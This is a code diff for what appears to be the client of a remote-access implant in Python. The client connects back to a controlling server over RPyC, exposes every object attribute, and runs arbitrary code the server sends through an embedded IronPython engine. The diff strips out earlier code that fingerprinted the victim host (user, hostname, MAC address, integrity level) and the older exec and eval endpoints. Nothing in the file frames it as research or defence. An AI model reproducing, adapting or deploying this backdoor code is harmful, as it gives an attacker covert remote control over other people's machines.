@@ -1,26 +1,28 @@
 # -*- coding: utf-8 -*-
 
-import platform
-import uuid
-import os
-import rpyc
-import ctypes
+from __future__ import unicode_literals, print_function
+import clr
 import locale
+import rpyc
 import sys
 import json
 import logging
 import zlib
-from ctypes import windll, WinError, create_unicode_buffer, byref, c_uint32, GetLastError
+#import threading
+#from Queue import Queue
 from rpyc.core.channel import Channel
 from rpyc.core.stream import SocketStream
-from rpyc.core.service import Service, ModuleNamespace
-from rpyc.lib.compat import execute
+from rpyc.core.service import Service
+
+clr.AddReference('IronPython')
+
+from IronPython.Hosting import Python
+
 
 logging.basicConfig(format="%(asctime)s [%(levelname)s] - %(filename)s: %(funcName)s - %(message)s", level=logging.DEBUG)
 
-os_encoding = locale.getpreferredencoding() or "utf8"
-namespace = None
 infos = {}
+#queue = Queue(maxsize=1)
 
 REVERSE_SLAVE_CONF = dict(
     allow_all_attrs=True,
@@ -54,265 +56,35 @@ def obtain(proxy):
     return safe_obtain(proxy)
 
 
-def get_integrity_level():
-    '''from http://www.programcreek.com/python/example/3211/ctypes.c_long'''
-
-    mapping = {
-        0x0000: u'Untrusted',
-        0x1000: u'Low',
-        0x2000: u'Medium',
-        0x2100: u'Medium high',
-        0x3000: u'High',
-        0x4000: u'System',
-        0x5000: u'Protected process',
-    }
-
-    BOOL = ctypes.c_long
-    DWORD = ctypes.c_ulong
-    HANDLE = ctypes.c_void_p
-
-    class SID_AND_ATTRIBUTES(ctypes.Structure):
-        _fields_ = [
-            ('Sid', ctypes.c_void_p),
-            ('Attributes', DWORD),
-        ]
-
-    class TOKEN_MANDATORY_LABEL(ctypes.Structure):
-        _fields_ = [
-            ('Label', SID_AND_ATTRIBUTES),
-        ]
-
-    TOKEN_READ = DWORD(0x20008)
-    TokenIntegrityLevel = ctypes.c_int(25)
-    ERROR_INSUFFICIENT_BUFFER = 122
-
-    ctypes.windll.kernel32.GetLastError.argtypes = ()
-    ctypes.windll.kernel32.GetLastError.restype = DWORD
-    ctypes.windll.kernel32.GetCurrentProcess.argtypes = ()
-    ctypes.windll.kernel32.GetCurrentProcess.restype = ctypes.c_void_p
-    ctypes.windll.advapi32.OpenProcessToken.argtypes = (
-            HANDLE, DWORD, ctypes.POINTER(HANDLE))
-    ctypes.windll.advapi32.OpenProcessToken.restype = BOOL
-    ctypes.windll.advapi32.GetTokenInformation.argtypes = (
-            HANDLE, ctypes.c_long, ctypes.c_void_p, DWORD, ctypes.POINTER(DWORD))
-    ctypes.windll.advapi32.GetTokenInformation.restype = BOOL
-    ctypes.windll.advapi32.GetSidSubAuthorityCount.argtypes = [ctypes.c_void_p]
-    ctypes.windll.advapi32.GetSidSubAuthorityCount.restype = ctypes.POINTER(
-            ctypes.c_ubyte)
-    ctypes.windll.advapi32.GetSidSubAuthority.argtypes = (ctypes.c_void_p, DWORD)
-    ctypes.windll.advapi32.GetSidSubAuthority.restype = ctypes.POINTER(DWORD)
-
-    token = ctypes.c_void_p()
-    proc_handle = ctypes.windll.kernel32.GetCurrentProcess()
-    if not ctypes.windll.advapi32.OpenProcessToken(
-            proc_handle,
-            TOKEN_READ,
-            ctypes.byref(token)):
-        logging.error('Failed to get process token')
-        return None
-
-    if token.value == 0:
-        logging.error('Got a NULL token')
-        return None
-    try:
-        info_size = DWORD()
-        if ctypes.windll.advapi32.GetTokenInformation(
-                token,
-                TokenIntegrityLevel,
-                ctypes.c_void_p(),
-                info_size,
-                ctypes.byref(info_size)):
-            logging.error('GetTokenInformation() failed expectation')
-            return None
-
-        if info_size.value == 0:
-            logging.error('GetTokenInformation() returned size 0')
-            return None
-
-        if ctypes.windll.kernel32.GetLastError() != ERROR_INSUFFICIENT_BUFFER:
-            logging.error(
-                    'GetTokenInformation(): Unknown error: %d',
-                    ctypes.windll.kernel32.GetLastError())
-            return None
-
-        token_info = TOKEN_MANDATORY_LABEL()
-        ctypes.resize(token_info, info_size.value)
-        if not ctypes.windll.advapi32.GetTokenInformation(
-                token,
-                TokenIntegrityLevel,
-                ctypes.byref(token_info),
-                info_size,
-                ctypes.byref(info_size)):
-            logging.error(
-                    'GetTokenInformation(): Unknown error with buffer size %d: %d',
-                    info_size.value,
-                    ctypes.windll.kernel32.GetLastError())
-            return None
-
-        p_sid_size = ctypes.windll.advapi32.GetSidSubAuthorityCount(
-                token_info.Label.Sid)
-        res = ctypes.windll.advapi32.GetSidSubAuthority(
-                token_info.Label.Sid, p_sid_size.contents.value - 1)
-        value = res.contents.value
-        return mapping.get(value) or u'0x%04x' % value
-
-    finally:
-        ctypes.windll.kernel32.CloseHandle(token)
-
-
-def GetUserName():
-    DWORD = c_uint32
-    nSize = DWORD(0)
-    windll.advapi32.GetUserNameW(None, byref(nSize))
-    error = GetLastError()
-
-    ERROR_INSUFFICIENT_BUFFER = 122
-    if error != ERROR_INSUFFICIENT_BUFFER:
-        raise WinError(error)
-
-    lpBuffer = create_unicode_buffer('', nSize.value + 1)
-
-    success = windll.advapi32.GetUserNameW(lpBuffer, byref(nSize))
-    if not success:
-        raise WinError()
-
-    return lpBuffer.value
-
-
-def get_uuid():
-    user = None
-    node = None
-    plat = None
-    release = None
-    version = None
-    machine = None
-    macaddr = None
-    pid = None
-    proc_arch = None
-    proc_path = sys.executable
-    integrity_level = None
-
-    try:
-        user = GetUserName().encode("utf8")
-    except Exception as e:
-        user = str(e)
-
-    try:
-        node = platform.node().decode(
-            encoding=os_encoding
-        ).encode("utf8")
-    except Exception:
-        pass
-
-    try:
-        version = platform.platform()
-    except Exception:
-        pass
-
-    try:
-        plat = platform.system()
-    except Exception:
-        pass
-
-    try:
-        release = platform.release()
-    except Exception:
-        pass
-
-    try:
-        version = platform.version()
-    except Exception:
-        pass
-
-    try:
-        machine = platform.machine()
-    except Exception:
-        pass
-
-    try:
-        pid = os.getpid()
-    except Exception:
-        pass
-
-    try:
-        osname = os.name
-    except Exception:
-        pass
-
-    try:
-        proc_arch = platform.architecture()[0]
-    except Exception:
-        pass
-
-    try:
-        macaddr = uuid.getnode()
-        macaddr = ':'.join(("%012X" % macaddr)[i:i + 2] for i in range(0, 12, 2))
-    except Exception:
-        pass
-
-    try:
-        integrity_level = get_integrity_level()
-    except Exception as e:
-        integrity_level = "?"
-
-    return {
-        'user': user,
-        'hostname': node,
-        'platform': plat,
-        'release': release,
-        'version': version,
-        'os_arch': machine,
-        'os_name': osname,
-        'macaddr': macaddr,
-        'pid': pid,
-        'proc_arch': proc_arch,
-        'exec_path': proc_path,
-        'intgty_lvl': integrity_level
-    }
-
-
 class STChannel(Channel):
     COMPRESSION_LEVEL = 6
 
 
-class UpdatableModuleNamespace(ModuleNamespace):
-    __slots__ = ['__invalidate__']
-
-    def __invalidate__(self, name):
-        cache = self._ModuleNamespace__cache
-        if name in cache:
-            del cache[name]
-
-
 class ReverseSlaveService(Service):
 
-    __slots__ = ["exposed_namespace", "exposed_cleanups"]
+    __slots__ = ["exposed_cleanups"]
 
     def on_connect(self):
-        self.exposed_namespace = {}
         self.exposed_cleanups = []
         self._conn._config.update(REVERSE_SLAVE_CONF)
 
-        global infos
-        if not infos:
-            infos = get_uuid()
-
-        namespace = UpdatableModuleNamespace(self.exposed_getmodule)
-        self._conn.root.set_modules(namespace)
+        #global infos
+        #if not infos:
+        #    infos = get_uuid()
 
     def on_disconnect(self):
         for cleanup in self.exposed_cleanups:
             try:
                 cleanup()
             except Exception as e:
-                print_exception('[D]')
+                print('[D]')
 
         self.exposed_cleanups = []
 
         try:
             self._conn.close()
         except Exception as e:
-            print "Error closing connection:", str(e)
+            print("Error closing connection:", str(e))
 
     def exposed_exit(self):
         try:
@@ -340,16 +112,14 @@ class ReverseSlaveService(Service):
         self.exposed_cleanups.remove(method)
 
     def exposed_execute(self, text):
-        """execute arbitrary code (using ``exec``)"""
-        execute(text, self.exposed_namespace)
+        engine = Python.CreateEngine()
 
-    def exposed_eval(self, text):
-        """evaluate arbitrary code (using ``eval``)"""
-        return eval(text, self.exposed_namespace)
+        hosted_sys = Python.GetSysModule(engine)
+        hosted_sys.path = sys.path
+        hosted_sys.meta_path = sys.meta_path
 
-    def exposed_getmodule(self, name):
-        """imports an arbitrary module"""
-        return __import__(name, None, None, "*")
+        result = engine.Execute(text)
+        return result
 
     def exposed_json_dumps(self, obj, compressed=False):
         try:
@@ -387,7 +157,7 @@ while True:
         conn = rpyc.connect_channel(STChannel(s), service=ReverseSlaveService)
         break
     except Exception as e:
-        pass
+        logging.error('Error connnecting to server: {}'.format(e))
 
 bgsrv = rpyc.BgServingThread(conn)
 bgsrv._thread.join()
